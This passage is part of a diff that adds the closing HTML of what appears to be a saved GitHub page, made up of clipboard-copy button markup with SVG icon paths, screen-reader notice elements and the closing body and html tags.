+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div>
+
+
+  <div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div>
+
+
+
+
+
+    </div>
+    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true"></div>
+    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
+  
+
+
+</body></html>
